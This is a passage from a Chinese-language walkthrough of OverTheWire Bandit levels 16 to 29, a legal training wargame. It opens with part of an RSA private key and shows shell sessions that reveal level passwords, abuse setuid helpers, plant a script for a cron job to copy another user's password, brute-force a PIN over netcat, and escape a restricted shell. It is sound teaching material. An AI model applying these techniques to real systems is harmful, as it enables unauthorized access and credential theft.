Ja6Lzb558YW3FZl87ORiO+rW4LCDCNd2lUvLE/GL2GWyuKN0K5iCd5TbtJzEkQTu
DSt2mcNn4rhAL+JFr56o4T6z8WWAW18BR6yGrMq7Q/kALHYW3OekePQAzL0VUYbW
JGTi65CxbCnzc/w4+mqQyvmzpWtMAzJTzAzQxNbkR2MBGySxDLrjg0LWN6sK7wNX
x0YVztz/zbIkPjfkU1jHS+9EbVNj+D1XFOJuaQIDAQABAoIBABagpxpM1aoLWfvD
KHcj10nqcoBc4oE11aFYQwik7xfW+24pRNuDE6SFthOar69jp5RlLwD1NhPx3iBl
J9nOM8OJ0VToum43UOS8YxF8WwhXriYGnc1sskbwpXOUDc9uX4+UESzH22P29ovd
d8WErY0gPxun8pbJLmxkAtWNhpMvfe0050vk9TL5wqbu9AlbssgTcCXkMQnPw9nC
YNN6DDP2lbcBrvgT9YCNL6C+ZKufD52yOQ9qOkwFTEQpjtF4uNtJom+asvlpmS8A
vLY9r60wYSvmZhNqBUrj7lyCtXMIu1kkd4w7F77k+DjHoAXyxcUp1DGL51sOmama
+TOWWgECgYEA8JtPxP0GRJ+IQkX262jM3dEIkza8ky5moIwUqYdsx0NxHgRRhORT
8c8hAuRBb2G82so8vUHk/fur85OEfc9TncnCY2crpoqsghifKLxrLgtT+qDpfZnx
SatLdt8GfQ85yA7hnWWJ2MxF3NaeSDm75Lsm+tBbAiyc9P2jGRNtMSkCgYEAypHd
HCctNi/FwjulhttFx/rHYKhLidZDFYeiE/v45bN4yFm8x7R/b0iE7KaszX+Exdvt
SghaTdcG0Knyw1bpJVyusavPzpaJMjdJ6tcFhVAbAjm7enCIvGCSx+X3l5SiWg0A
R57hJglezIiVjv3aGwHwvlZvtszK6zV6oXFAu0ECgYAbjo46T4hyP5tJi93V5HDi
Ttiek7xRVxUl+iU7rWkGAXFpMLFteQEsRr7PJ/lemmEY5eTDAFMLy9FL2m9oQWCg
R8VdwSk8r9FGLS+9aKcV5PI/WEKlwgXinB3OhYimtiG2Cg5JCqIZFHxD6MjEGOiu
L8ktHMPvodBwNsSBULpG0QKBgBAplTfC1HOnWiMGOU3KPwYWt0O6CdTkmJOmL8Ni
blh9elyZ9FsGxsgtRBXRsqXuz7wtsQAgLHxbdLq/ZJQ7YfzOKU4ZxEnabvXnvWkU
YOdjHdSOoKvDQNWu6ucyLRAWFuISeXw9a/9p7ftpxm0TSgyvmfLF2MIAEwyzRqaM
77pBAoGAMmjmIJdjp+Ez8duyn3ieo36yrttF5NSsJLAbxFpdlc1gvtGCWW+9Cq0b
dxviW8+TFVEBl1O4f7HVm6EpTscdDxU+bCXWkfjuRb7Dy9GOtt9JPsX8MBTakzh3
vBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY=
-----END RSA PRIVATE KEY-----
```

31518 端口是迷惑人的，我服了。

这里必须加`-quiet`参数，不加，管道符可能导致整条命令出错。

## level17

```shell
bandit17@bandit:~$ ls -al
total 36
drwxr-xr-x   3 root     root     4096 Oct 14 09:26 .
drwxr-xr-x 150 root     root     4096 Oct 14 09:29 ..
-rw-r-----   1 bandit17 bandit17   33 Oct 14 09:26 .bandit16.password
-rw-r--r--   1 root     root      220 Mar 31  2024 .bash_logout
-rw-r--r--   1 root     root     3851 Oct 14 09:19 .bashrc
-rw-r-----   1 bandit18 bandit17 3300 Oct 14 09:26 passwords.new
-rw-r-----   1 bandit18 bandit17 3300 Oct 14 09:26 passwords.old
-rw-r--r--   1 root     root      807 Mar 31  2024 .profile
drwxr-xr-x   2 root     root     4096 Oct 14 09:26 .ssh
bandit17@bandit:~$ diff passwords.
passwords.new  passwords.old  
bandit17@bandit:~$ diff passwords.
passwords.new  passwords.old  
bandit17@bandit:~$ diff passwords.new  passwords.old 
42c42
< x2gLTTjFwMOhQ8oWNbMN362QKxfRqGlO
---
> BMIOFKM7CRSLI97voLp3TD80NAq5exxk
```

`diff` 用于找出两个文件的差异，并显示哪一行有区别。

## level18

```shell
warn@kali:~/Desktop$ ssh bandit18@bandit.labs.overthewire.org -p 2220 "ls -al"       
                         _                     _ _ _   
                        | |__   __ _ _ __   __| (_) |_ 
                        | '_ \ / _` | '_ \ / _` | | __|
                        | |_) | (_| | | | | (_| | | |_ 
                        |_.__/ \__,_|_| |_|\__,_|_|\__|
                                                       

                      This is an OverTheWire game server. 
            More information on http://www.overthewire.org/wargames

backend: gibson-0
bandit18@bandit.labs.overthewire.org's password: 
total 24
drwxr-xr-x   2 root     root     4096 Oct 14 09:26 .
drwxr-xr-x 150 root     root     4096 Oct 14 09:29 ..
-rw-r--r--   1 root     root      220 Mar 31  2024 .bash_logout
-rw-r-----   1 bandit19 bandit18 3874 Oct 14 09:26 .bashrc
-rw-r--r--   1 root     root      807 Mar 31  2024 .profile
-rw-r-----   1 bandit19 bandit18   33 Oct 14 09:26 readme
                                                                                               
warn@kali:~/Desktop$ ssh bandit18@bandit.labs.overthewire.org -p 2220 "ls -al&&cat readme"
                         _                     _ _ _   
                        | |__   __ _ _ __   __| (_) |_ 
                        | '_ \ / _` | '_ \ / _` | | __|
                        | |_) | (_| | | | | (_| | | |_ 
                        |_.__/ \__,_|_| |_|\__,_|_|\__|
                                                       

                      This is an OverTheWire game server. 
            More information on http://www.overthewire.org/wargames

backend: gibson-0
bandit18@bandit.labs.overthewire.org's password: 
total 24
drwxr-xr-x   2 root     root     4096 Oct 14 09:26 .
drwxr-xr-x 150 root     root     4096 Oct 14 09:29 ..
-rw-r--r--   1 root     root      220 Mar 31  2024 .bash_logout
-rw-r-----   1 bandit19 bandit18 3874 Oct 14 09:26 .bashrc
-rw-r--r--   1 root     root      807 Mar 31  2024 .profile
-rw-r-----   1 bandit19 bandit18   33 Oct 14 09:26 readme
cGWpMaKXVwDUNgPAVJbWYuGHVn9zl3j8
```

无法登陆上去，主要是利用ssh 执行远程命令。

## level19

```shell
bandit19@bandit:~$ ls -al
total 36
drwxr-xr-x   2 root     root      4096 Oct 14 09:26 .
drwxr-xr-x 150 root     root      4096 Oct 14 09:29 ..
-rwsr-x---   1 bandit20 bandit19 14884 Oct 14 09:26 bandit20-do
-rw-r--r--   1 root     root       220 Mar 31  2024 .bash_logout
-rw-r--r--   1 root     root      3851 Oct 14 09:19 .bashrc
-rw-r--r--   1 root     root       807 Mar 31  2024 .profile
bandit19@bandit:~$ bandit20-do
bandit20-do: command not found
bandit19@bandit:~$ ./bandit20-do
Run a command as another user.
  Example: ./bandit20-do whoami
bandit19@bandit:~$ ./bandit20-do whoami
bandit20
bandit19@bandit:~$ ./bandit20-do cat /etc/bandit_pass/bandit20
0qXahG8ZjOVMN9Ghs7iOWsCfZyXOUbYO
```

bandit20-do 有suid 位，所以它拥有bandit20的权限，可以读取文件所属者位bandit20的文件。

## level20(这里好好理解)

```bash
终端1：
bandit20@bandit:~$ ./suconnect 31000
Read: 0qXahG8ZjOVMN9Ghs7iOWsCfZyXOUbYO
Password matches, sending next password
终端2：
bandit20@bandit:~$ cat /etc/bandit_pass/bandit20 | nc -lvvnp 31000
Listening on 0.0.0.0 31000
Connection received on 127.0.0.1 52078
EeoULMCra2q0dSkYj561DX7s1CpBuOBt
```

`nc localhost 30000` : 连接 30000 端口，一般用于主动连接。

`nc -lvvnp 30000` : 开放 30000 端口， 一般用于被动连接。

## level21

```shell
bandit21@bandit:~$ cd /etc/cron.d
bandit21@bandit:/etc/cron.d$ ls -al
total 60
drwxr-xr-x   2 root root  4096 Oct 14 09:29 .
drwxr-xr-x 128 root root 12288 Oct 27 05:55 ..
-r--r-----   1 root root    47 Oct 14 09:26 behemoth4_cleanup
-rw-r--r--   1 root root   123 Oct 14 09:19 clean_tmp
-rw-r--r--   1 root root   120 Oct 14 09:26 cronjob_bandit22
-rw-r--r--   1 root root   122 Oct 14 09:26 cronjob_bandit23
-rw-r--r--   1 root root   120 Oct 14 09:26 cronjob_bandit24
-rw-r--r--   1 root root   201 Apr  8  2024 e2scrub_all
-r--r-----   1 root root    48 Oct 14 09:27 leviathan5_cleanup
-rw-------   1 root root   138 Oct 14 09:28 manpage3_resetpw_job
-rwx------   1 root root    52 Oct 14 09:29 otw-tmp-dir
-rw-r--r--   1 root root   102 Mar 31  2024 .placeholder
-rw-r--r--   1 root root   396 Jan  9  2024 sysstat
bandit21@bandit:/etc/cron.d$ cat cronjob_bandit22
@reboot bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
bandit21@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit22.sh
#!/bin/bash
chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
bandit21@bandit:/etc/cron.d$ ls -al /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
-rw-r--r-- 1 bandit22 bandit22 33 Mar 23 04:52 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
bandit21@bandit:/etc/cron.d$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
tRae0UfB9v0UzbCdn9cY0gQnds9GF58Q
```

这里主要考察的是定时任务，`* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null`，以bandit22的身份执行此命令，`* * * * * ` 代表每分钟执行.

`/etc/cron.d : 存放定时任务脚本的地方。`

## level22

```shell
bandit22@bandit:~$ cd /etc/cron.d
bandit22@bandit:/etc/cron.d$ ls -al
total 60
drwxr-xr-x   2 root root  4096 Oct 14 09:29 .
drwxr-xr-x 128 root root 12288 Oct 27 05:55 ..
-r--r-----   1 root root    47 Oct 14 09:26 behemoth4_cleanup
-rw-r--r--   1 root root   123 Oct 14 09:19 clean_tmp
-rw-r--r--   1 root root   120 Oct 14 09:26 cronjob_bandit22
-rw-r--r--   1 root root   122 Oct 14 09:26 cronjob_bandit23
-rw-r--r--   1 root root   120 Oct 14 09:26 cronjob_bandit24
-rw-r--r--   1 root root   201 Apr  8  2024 e2scrub_all
-r--r-----   1 root root    48 Oct 14 09:27 leviathan5_cleanup
-rw-------   1 root root   138 Oct 14 09:28 manpage3_resetpw_job
-rwx------   1 root root    52 Oct 14 09:29 otw-tmp-dir
-rw-r--r--   1 root root   102 Mar 31  2024 .placeholder
-rw-r--r--   1 root root   396 Jan  9  2024 sysstat
bandit22@bandit:/etc/cron.d$ cat cronjob_bandit23
@reboot bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
bandit22@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit23.sh
#!/bin/bash

myname=$(whoami)
mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)

echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"

cat /etc/bandit_pass/$myname > /tmp/$mytarget
bandit22@bandit:/etc/cron.d$ echo I am user bandit23
I am user bandit23
bandit22@bandit:/etc/cron.d$ echo I am user bandit23 |md5sum
8ca319486bfbbc3663ea0fbe81326349  -
bandit22@bandit:/etc/cron.d$ echo I am user bandit23 | md5sum |cut -d ' ' -f 1
8ca319486bfbbc3663ea0fbe81326349
bandit22@bandit:/etc/cron.d$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349
0Zf11ioIjMVN551jX3CmStKLYqjk54Ga
```

cut 是用于截取字符串的；-d 以 空格作为分隔符；-f 选取哪一个字符串。

md5sum 是用于计算文件或数据MD5值的一个工具。

## level23

```shell
bandit23@bandit:~$ cd /etc/cron.d
bandit23@bandit:/etc/cron.d$ ls -al
total 60
drwxr-xr-x   2 root root  4096 Oct 14 09:29 .
drwxr-xr-x 128 root root 12288 Oct 27 05:55 ..
-r--r-----   1 root root    47 Oct 14 09:26 behemoth4_cleanup
-rw-r--r--   1 root root   123 Oct 14 09:19 clean_tmp
-rw-r--r--   1 root root   120 Oct 14 09:26 cronjob_bandit22
-rw-r--r--   1 root root   122 Oct 14 09:26 cronjob_bandit23
-rw-r--r--   1 root root   120 Oct 14 09:26 cronjob_bandit24
-rw-r--r--   1 root root   201 Apr  8  2024 e2scrub_all
-r--r-----   1 root root    48 Oct 14 09:27 leviathan5_cleanup
-rw-------   1 root root   138 Oct 14 09:28 manpage3_resetpw_job
-rwx------   1 root root    52 Oct 14 09:29 otw-tmp-dir
-rw-r--r--   1 root root   102 Mar 31  2024 .placeholder
-rw-r--r--   1 root root   396 Jan  9  2024 sysstat
bandit23@bandit:/etc/cron.d$ cat cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
bandit23@bandit:/etc/cron.d$ ls -al /usr/bin/cronjob_bandit24.sh
-rwxr-xr-x 1 bandit24 bandit23 437 Jan 19 16:53 /usr/bin/cronjob_bandit24.sh
bandit23@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash
shopt -s nullglob
myname=$(whoami)

cd /var/spool/"$myname"/foo || exit
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." ] && [ "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" "./$i")"
        if [ "${owner}" = "bandit23" ] && [ -f "$i" ]; then
            timeout -s 9 60 "./$i"
        fi
        rm -rf "./$i"
    fi
done
bandit23@bandit:~$ cd /tmp
bandit23@bandit:/tmp$ cd 123
-bash: cd: 123: No such file or directory
bandit23@bandit:/tmp$ mkdir 123
bandit23@bandit:/tmp$ cd 123
bandit23@bandit:/tmp/123$ chmod 777 .
bandit23@bandit:/tmp/123$ cat > 1.txt <<EOF
> #!/bin/bash
shopt -s nullglob
myname=$(whoami)

cd /var/spool/"$myname"/foo || exit
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." ] && [ "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" "./$i")"
        if [ "${owner}" = "bandit23" ] && [ -f "$i" ]; then
            timeout -s 9 60 "./$i"
        fi
        rm -rf "./$i"
    fi
done
> EOF
# 在这里说明一下：
# <<EOF
# EOF
# $ 要转义，也就是：\$i 这样才不会被执行。
bandit23@bandit:/tmp/123$ ls -al
total 11088
drwxrwxrwx 2 bandit23 bandit23     4096 Mar 23 05:31 .
drwxrwx-wt 1 root     root     11325440 Mar 23 05:33 ..
-rw-rw-r-- 1 bandit23 bandit23       63 Mar 23 05:25 1.sh
-rw-rw-r-- 1 bandit23 bandit23      436 Mar 23 05:22 1.txt
-rw-rw-r-- 1 bandit23 bandit23       86 Mar 23 05:31 2.sh
bandit23@bandit:/tmp/123$ chmod +x 1.sh
bandit23@bandit:/tmp/123$ bash 2.sh
#!/bin/bash

cat /etc/bandit_pass/bandit24 > /tmp/123/bandit24
total 11088
drwxrwxrwx 2 bandit23 bandit23     4096 Mar 23 05:31 .
drwxrwx-wt 1 root     root     11325440 Mar 23 05:33 ..
-rwxrwxr-x 1 bandit23 bandit23       63 Mar 23 05:25 1.sh
-rw-rw-r-- 1 bandit23 bandit23      436 Mar 23 05:22 1.txt
-rw-rw-r-- 1 bandit23 bandit23       86 Mar 23 05:31 2.sh
bandit23@bandit:/tmp/123$ cat /var/spool/bandit24/foo/1.sh
#!/bin/bash

cat /etc/bandit_pass/bandit24 > /tmp/123/bandit24
bandit23@bandit:/tmp/123$ cat /var/spool/bandit24/foo/1.sh
cat: /var/spool/bandit24/foo/1.sh: No such file or directory
bandit23@bandit:/tmp/123$ ls -al
total 11092
drwxrwxrwx 2 bandit23 bandit23     4096 Mar 23 05:34 .
drwxrwx-wt 1 root     root     11325440 Mar 23 05:34 ..
-rwxrwxr-x 1 bandit23 bandit23       63 Mar 23 05:25 1.sh
-rw-rw-r-- 1 bandit23 bandit23      436 Mar 23 05:22 1.txt
-rw-rw-r-- 1 bandit23 bandit23       86 Mar 23 05:31 2.sh
-rw-rw-r-- 1 bandit24 bandit24       33 Mar 23 05:34 bandit24
bandit23@bandit:/tmp/123$ cat bandit24
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
bandit23@bandit:/tmp/123$ ./2.sh
-bash: ./2.sh: Permission denied
# ./ 执行文件时，该文件必须要有可执行的权限。
```

## level24 (bash 子进程交互 新方法)

```shell
bandit24@bandit:/tmp/123$ cat 1.sh
#!/usr/bin/env bash
#
password="gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8"
coproc NC { nc localhost 30002; }

for i in {0000..9999}; do
        printf '%s %s\n' "$password" "$i" >&"${NC[1]}"
        read -r line <&"${NC[0]}"
        printf '%s %s\n' "$line" "$i" | grep -iv "wrong"
done
bandit24@bandit:/tmp/123$ bash 1.sh
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space. 0000
Correct! 5063
The password of user bandit25 is iCi86ttT4KSNe1armKiwbQNmB3YJP3q4 5064
```

```bash
coproc NC { nc localhost 30002; }
```

- 启动一个后台进程：nc localhost 30002
- 给这个后台进程建立两条管道
- 让当前 Bash 脚本可以：
  - 往它的标准输入写数据
  - 从它的标准输出读数据

这里 NC 是这个 coprocess 的名字。定义后，Bash 会自动提供一个数组变量：

- NC[1]：写端，给 nc 发送数据
- NC[0]：读端，从 nc 接收数据

所以这句不是“普通变量赋值”，而是在后台拉起了一个可交互的子进程。

```bash
read -r line <&"${NC[0]}"
# -r 表示不要把反斜杠当转义符
```

```shell
exec {NC[1]}>&-
# {NC[1]} 是 写的端，把写端重定向到 -，表示结束
exec {NC[0]}<&-
# {NC[0]} 是 读的端，把- 重定向到 读端，表示结束。
# 不要写成 exec ${NC[0]}<$-
# 这里不是简单的普通变量替换。
```


这是在关闭文件描述符。

这一步的作用：

- 释放资源
- 告诉对端“我这边结束了”
- 避免脚本退出时留下没关闭的描述符

## level25 26 (需要再做一下)

```shell
bandit25@bandit:~$ cat /etc/passwd | grep "bandit"
bandit0:x:11000:11000:bandit level 0:/home/bandit0:/bin/bash
bandit1:x:11001:11001:bandit level 1:/home/bandit1:/bin/bash
bandit10:x:11010:11010:bandit level 10:/home/bandit10:/bin/bash
bandit11:x:11011:11011:bandit level 11:/home/bandit11:/bin/bash
bandit12:x:11012:11012:bandit level 12:/home/bandit12:/bin/bash
bandit13:x:11013:11013:bandit level 13:/home/bandit13:/bin/bash
bandit14:x:11014:11014:bandit level 14:/home/bandit14:/bin/bash
bandit15:x:11015:11015:bandit level 15:/home/bandit15:/bin/bash
bandit16:x:11016:11016:bandit level 16:/home/bandit16:/bin/bash
bandit17:x:11017:11017:bandit level 17:/home/bandit17:/bin/bash
bandit18:x:11018:11018:bandit level 18:/home/bandit18:/bin/bash
bandit19:x:11019:11019:bandit level 19:/home/bandit19:/bin/bash
bandit2:x:11002:11002:bandit level 2:/home/bandit2:/bin/bash
bandit20:x:11020:11020:bandit level 20:/home/bandit20:/bin/bash
bandit21:x:11021:11021:bandit level 21:/home/bandit21:/bin/bash
bandit22:x:11022:11022:bandit level 22:/home/bandit22:/bin/bash
bandit23:x:11023:11023:bandit level 23:/home/bandit23:/bin/bash
bandit24:x:11024:11024:bandit level 24:/home/bandit24:/bin/bash
bandit25:x:11025:11025:bandit level 25:/home/bandit25:/bin/bash
bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext
bandit27:x:11027:11027:bandit level 27:/home/bandit27:/bin/bash
bandit28:x:11028:11028:bandit level 28:/home/bandit28:/bin/bash
bandit29:x:11029:11029:bandit level 29:/home/bandit29:/bin/bash
bandit3:x:11003:11003:bandit level 3:/home/bandit3:/bin/bash
bandit30:x:11030:11030:bandit level 30:/home/bandit30:/bin/bash
bandit31:x:11031:11031:bandit level 31:/home/bandit31:/bin/bash
bandit32:x:11032:11032:bandit level 32:/home/bandit32:/home/bandit32/uppershell
bandit33:x:11033:11033:bandit level 33:/home/bandit33:/bin/bash
bandit4:x:11004:11004:bandit level 4:/home/bandit4:/bin/bash
bandit5:x:11005:11005:bandit level 5:/home/bandit5:/bin/bash
bandit6:x:11006:11006:bandit level 6:/home/bandit6:/bin/bash
bandit7:x:11007:11007:bandit level 7:/home/bandit7:/bin/bash
bandit8:x:11008:11008:bandit level 8:/home/bandit8:/bin/bash
bandit9:x:11009:11009:bandit level 9:/home/bandit9:/bin/bash
bandit27-git:x:11527:11527::/home/bandit27-git:/usr/bin/git-shell
bandit28-git:x:11528:11528::/home/bandit28-git:/usr/bin/git-shell
bandit29-git:x:11529:11529::/home/bandit29-git:/usr/bin/git-shell
bandit30-git:x:11530:11530::/home/bandit30-git:/usr/bin/git-shell
bandit31-git:x:11531:11531::/home/bandit31-git:/usr/bin/git-shell
bandit25@bandit:~$ /usr/bin/showtext
more: cannot open /home/bandit25/text.txt: No such file or directory
bandit25@bandit:~$ cat /usr/bin/showtext
#!/bin/sh

export TERM=linux

exec more ~/text.txt
exit 0
```

more命令：再未全部显示文本内容时，按v 可以进入vim 模式。

```
stty rows 6 cols 80
```

```shell
:set shell=/bin/bash
:shell
```

```
bandit26@bandit:~$ ls -al
total 44
drwxr-xr-x   3 root     root      4096 Oct 14 09:26 .
drwxr-xr-x 150 root     root      4096 Oct 14 09:29 ..
-rwsr-x---   1 bandit27 bandit26 14884 Oct 14 09:26 bandit27-do
-rw-r--r--   1 root     root       220 Mar 31  2024 .bash_logout
-rw-r--r--   1 root     root      3851 Oct 14 09:19 .bashrc
-rw-r--r--   1 root     root       807 Mar 31  2024 .profile
drwxr-xr-x   2 root     root      4096 Oct 14 09:26 .ssh
-rw-r-----   1 bandit26 bandit26   258 Oct 14 09:26 text.txt
bandit26@bandit:~$ ./bandit27-do
Run a command as another user.
  Example: ./bandit27-do id
bandit26@bandit:~$ ./bandit27-do id
uid=11026(bandit26) gid=11026(bandit26) euid=11027(bandit27) groups=11026(bandit26)
bandit26@bandit:~$ ./bandit27-do cat /etc/bandit_pass/bandit27
upsNCc7vzaRDx6oZC6GiR6ERwe1MowGB
bandit26@bandit:~$
```

## level27

```shell
warn@kali:~/Desktop$ git clone ssh://bandit27-git@bandit.labs.overthewire.org:2220/home/bandit27-git/repo
Cloning into 'repo'...
                         _                     _ _ _
                        | |__   __ _ _ __   __| (_) |_
                        | '_ \ / _` | '_ \ / _` | | __|
                        | |_) | (_| | | | | (_| | | |_
                        |_.__/ \__,_|_| |_|\__,_|_|\__|


                      This is an OverTheWire game server.
            More information on http://www.overthewire.org/wargames

backend: gibson-0
bandit27-git@bandit.labs.overthewire.org's password:
remote: Enumerating objects: 3, done.
remote: Counting objects: 100% (3/3), done.
remote: Compressing objects: 100% (2/2), done.
remote: Total 3 (delta 0), reused 0 (delta 0), pack-reused 0
Receiving objects: 100% (3/3), done.
warn@kali:~/Desktop$ cd repo

warn@kali:~/Desktop/repo$ ls -la
total 16
drwxrwxr-x  3 warn warn 4096 Mar 23 15:24 .
drwxr-xr-x 10 warn warn 4096 Mar 23 15:23 ..
drwxrwxr-x  7 warn warn 4096 Mar 23 15:24 .git
-rw-rw-r--  1 warn warn   68 Mar 23 15:24 README

warn@kali:~/Desktop/repo$ cd .git

warn@kali:~/Desktop/repo/.git$ ls -al
total 48
drwxrwxr-x 7 warn warn 4096 Mar 23 15:24 .
drwxrwxr-x 3 warn warn 4096 Mar 23 15:24 ..
-rw-rw-r-- 1 warn warn  299 Mar 23 15:24 config
-rw-rw-r-- 1 warn warn   73 Mar 23 15:23 description
-rw-rw-r-- 1 warn warn   23 Mar 23 15:24 HEAD
drwxrwxr-x 2 warn warn 4096 Mar 23 15:23 hooks
-rw-rw-r-- 1 warn warn  137 Mar 23 15:24 index
drwxrwxr-x 2 warn warn 4096 Mar 23 15:23 info
drwxrwxr-x 3 warn warn 4096 Mar 23 15:24 logs
drwxrwxr-x 4 warn warn 4096 Mar 23 15:23 objects
-rw-rw-r-- 1 warn warn  114 Mar 23 15:24 packed-refs
drwxrwxr-x 5 warn warn 4096 Mar 23 15:24 refs

warn@kali:~/Desktop/repo/.git$ cd ..

warn@kali:~/Desktop/repo$ git log
commit d196a00dd9d66169d27bc7819c2c26f1b679524f (HEAD -> master, origin/master, origin/HEAD)
Author: Ben Dover <noone@overthewire.org>
Date:   Tue Oct 14 09:26:17 2025 +0000

    initial commit of README

warn@kali:~/Desktop/repo$ git show d196a00dd9d66169d27bc7819c2c26f1b679524f
commit d196a00dd9d66169d27bc7819c2c26f1b679524f (HEAD -> master, origin/master, origin/HEAD)
Author: Ben Dover <noone@overthewire.org>
Date:   Tue Oct 14 09:26:17 2025 +0000

    initial commit of README

diff --git a/README b/README
new file mode 100644
index 0000000..17d60e0
--- /dev/null
+++ b/README
@@ -0,0 +1 @@
+The password to the next level is: Yz9IpL0sBcCeuG7m9uQFt8ZNpS4HZRcN
```

## level28

```shell
warn@kali:~/Desktop$ git clone ssh://bandit28-git@bandit.labs.overthewire.org:2220/home/bandit28-git/repo
Cloning into 'repo'...
                         _                     _ _ _
                        | |__   __ _ _ __   __| (_) |_
                        | '_ \ / _` | '_ \ / _` | | __|
                        | |_) | (_| | | | | (_| | | |_
                        |_.__/ \__,_|_| |_|\__,_|_|\__|


                      This is an OverTheWire game server.
            More information on http://www.overthewire.org/wargames

backend: gibson-0
bandit28-git@bandit.labs.overthewire.org's password:
remote: Enumerating objects: 9, done.
remote: Counting objects: 100% (9/9), done.
remote: Compressing objects: 100% (6/6), done.
remote: Total 9 (delta 2), reused 0 (delta 0), pack-reused 0
Receiving objects: 100% (9/9), done.
Resolving deltas: 100% (2/2), done.

warn@kali:~/Desktop$ ls -al
total 60
drwxr-xr-x 10 warn warn 4096 Mar 23 15:35 .
drwx------ 22 warn warn 4096 Mar 23 15:21 ..
drwxrwxr-x  2 warn warn 4096 Oct 14 17:04 app
drwxrwxr-x  4 warn warn 4096 Mar 22 13:06 code
drwxrwxr-x  7 warn warn 4096 Mar 15 16:03 .git
-rw-------  1 warn warn 2602 Mar  3 22:39 .iris_key
drwxrwxr-x  2 warn warn 4096 Mar 16 14:10 picture_steg
drwxrwxr-x  3 warn warn 4096 Mar 23 15:35 repo
drwxrwxr-x  3 warn warn 4096 Mar 17 14:40 reports
-rw-rw-r--  1 warn warn  697 Mar 22 14:38 result.txt
-rw-rw-r--  1 warn warn  102 Mar 18 21:51 secretz.csv
-rw-------  1 warn warn 1679 Mar 22 13:11 sshkey.private
-rw-------  1 warn warn 1675 Mar 22 14:19 sshkey.rsa
drwxrwxrwx  8 warn warn 4096 Mar 15 17:13 sstv
drwxrwxr-x  3 warn warn 4096 Oct 15 16:54 upload

warn@kali:~/Desktop$ cd repo

warn@kali:~/Desktop/repo$ ls -al
total 16
drwxrwxr-x  3 warn warn 4096 Mar 23 15:35 .
drwxr-xr-x 10 warn warn 4096 Mar 23 15:35 ..
drwxrwxr-x  7 warn warn 4096 Mar 23 15:35 .git
-rw-rw-r--  1 warn warn  111 Mar 23 15:35 README.md

warn@kali:~/Desktop/repo$ git log                                                                    commit b0354c7be30f500854c5fc971c57e9cbe632fef6 (HEAD -> master, origin/master, origin/HEAD)
Author: Morla Porla <morla@overthewire.org>
Date:   Tue Oct 14 09:26:19 2025 +0000

    fix info leak

commit d0cf2ab7dd7ebc6075b59102a980155268f0fe8f
Author: Morla Porla <morla@overthewire.org>
Date:   Tue Oct 14 09:26:19 2025 +0000

    add missing data

commit bd6bc3a57f81518bb2ce63f5816607a754ba730d
Author: Ben Dover <noone@overthewire.org>
Date:   Tue Oct 14 09:26:18 2025 +0000

    initial commit of README.md

warn@kali:~/Desktop/repo$ git show d0cf2ab7dd7ebc6075b59102a980155268f0fe8f
commit d0cf2ab7dd7ebc6075b59102a980155268f0fe8f
Author: Morla Porla <morla@overthewire.org>
Date:   Tue Oct 14 09:26:19 2025 +0000

    add missing data

diff --git a/README.md b/README.md
index 7ba2d2f..d4e3b74 100644
--- a/README.md
+++ b/README.md
@@ -4,5 +4,5 @@ Some notes for level29 of bandit.
 ## credentials

 - username: bandit29
-- password: <TBD>
+- password: 4pT1t5DENaYuqnqvadYs1oE4QLCdjmJ7
```

## level29(需要重新做一遍)

```shell
warn@kali:~/Desktop$ git clone ssh://bandit29-git@bandit.labs.overthewire.org:2220/home/bandit29-git/repo
Cloning into 'repo'...
                         _                     _ _ _
                        | |__   __ _ _ __   __| (_) |_
                        | '_ \ / _` | '_ \ / _` | | __|
                        | |_) | (_| | | | | (_| | | |_
                        |_.__/ \__,_|_| |_|\__,_|_|\__|


                      This is an OverTheWire game server.
            More information on http://www.overthewire.org/wargames

backend: gibson-0
bandit29-git@bandit.labs.overthewire.org's password:
remote: Enumerating objects: 16, done.
remote: Counting objects: 100% (16/16), done.
remote: Compressing objects: 100% (11/11), done.
remote: Total 16 (delta 2), reused 0 (delta 0), pack-reused 0
Receiving objects: 100% (16/16), done.
Resolving deltas: 100% (2/2), done.
warn@kali:~/Desktop$ cd repo
warn@kali:~/Desktop/repo$ git branch -a
* master
  remotes/origin/HEAD -> origin/master
  remotes/origin/dev
  remotes/origin/master
  remotes/origin/sploits-dev
warn@kali:~/Desktop/repo$ git checkout dev                                                           branch 'dev' set up to track 'origin/dev'.
Switched to a new branch 'dev'

warn@kali:~/Desktop/repo$ ls -al
total 20
drwxrwxr-x  4 warn warn 4096 Mar 23 15:40 .
drwxr-xr-x 10 warn warn 4096 Mar 23 15:37 ..
drwxrwxr-x  2 warn warn 4096 Mar 23 15:40 code
drwxrwxr-x  7 warn warn 4096 Mar 23 15:40 .git
-rw-rw-r--  1 warn warn  134 Mar 23 15:40 README.md

warn@kali:~/Desktop/repo$ cd code

